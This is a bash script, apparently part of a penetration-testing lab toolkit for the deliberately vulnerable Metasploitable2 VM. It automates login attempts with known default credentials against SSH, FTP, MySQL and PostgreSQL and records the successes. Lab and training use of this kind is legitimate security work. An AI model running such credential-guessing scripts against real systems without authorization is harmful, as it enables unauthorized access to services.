#!/usr/bin/env bash
# Phase 4 — Credenciales por defecto conocidas de Metasploitable2
# Ejecutar ANTES de brute-force.sh — probar manualmente primero es más rápido y menos ruidoso

source "$(dirname "$0")/../lib/common.sh"

validate_target "${LAB_TARGET}"
EVIDENCE_DIR=$(init_evidence_dir "phase-4-credentials")
banner "Phase 4 — Default credentials check"

RESULTS="${EVIDENCE_DIR}/default-creds-results.txt"
echo "service,user,password,result" > "$RESULTS"

try_ssh() {
    local user="$1" pass="$2"
    # Metasploitable2 corre OpenSSH 4.7p1 con algoritmos legacy:
    # - KexAlgorithms: diffie-hellman-group1-sha1
    # - MACs: hmac-md5, hmac-sha1 (no SHA-2)
    # - HostKey: ssh-rsa (aceptado con PubkeyAcceptedAlgorithms)
    sshpass -p "$pass" ssh \
        -o StrictHostKeyChecking=no \
        -o ConnectTimeout=5 \
        -o BatchMode=no \
        -o KexAlgorithms=+diffie-hellman-group1-sha1 \
        -o "MACs=+hmac-md5,hmac-sha1" \
        -o HostKeyAlgorithms=+ssh-rsa \
        -o PubkeyAuthentication=no \
        "${user}@${LAB_TARGET}" "id" 2>/dev/null && echo "SUCCESS" || echo "FAILED"
}

try_ftp() {
    local user="$1" pass="$2"
    timeout 5 curl -s --user "${user}:${pass}" \
        "ftp://${LAB_TARGET}/" 2>&1 | grep -q "^-\|^d" && echo "SUCCESS" || echo "FAILED"
}

try_mysql() {
    local user="$1" pass="$2"
    local pass_flag="--password="
    [[ -n "$pass" ]] && pass_flag="--password=${pass}"
    timeout 5 mysql -h "$LAB_TARGET" -u "$user" "$pass_flag" \
        -e "SELECT VERSION();" 2>/dev/null | grep -q "[0-9]" && echo "SUCCESS" || echo "FAILED"
}

try_postgres() {
    local user="$1" pass="$2"
    timeout 5 PGPASSWORD="$pass" psql -h "$LAB_TARGET" -U "$user" \
        -c "SELECT version();" 2>/dev/null | grep -q "PostgreSQL" && echo "SUCCESS" || echo "FAILED"
}

# Pares user:pass conocidos para Metasploitable2
CREDS=(
    "msfadmin:msfadmin"
    "root:root"
    "admin:admin"
    "user:user"
    "postgres:postgres"
    "service:service"
    "vagrant:vagrant"
)

log INFO "Testing ${#CREDS[@]} credential pairs against SSH and FTP"

for pair in "${CREDS[@]}"; do
    USER="${pair%%:*}"
    PASS="${pair##*:}"

    log INFO "Trying SSH  ${USER}:${PASS}"
    SSH_RESULT=$(try_ssh "$USER" "$PASS")
    echo "ssh,${USER},${PASS},${SSH_RESULT}" | tee -a "$RESULTS"

    log INFO "Trying FTP  ${USER}:${PASS}"
    FTP_RESULT=$(try_ftp "$USER" "$PASS")
    echo "ftp,${USER},${PASS},${FTP_RESULT}" | tee -a "$RESULTS"
done

log INFO "Testing database default credentials"

# MySQL: root con password vacío (vulnerabilidad conocida de Metasploitable2)
log INFO "Trying MySQL  root:(empty password)"
MYSQL_RESULT=$(try_mysql "root" "")
echo "mysql,root,,${MYSQL_RESULT}" | tee -a "$RESULTS"

# PostgreSQL: postgres:postgres
log INFO "Trying PostgreSQL  postgres:postgres"
PG_RESULT=$(try_postgres "postgres" "postgres")
echo "postgresql,postgres,postgres,${PG_RESULT}" | tee -a "$RESULTS"

log INFO "Summary of successful logins:"
grep "SUCCESS" "$RESULTS" | tee -a "${EVIDENCE_DIR}/run.log" || log INFO "No successful default logins found"

finalize
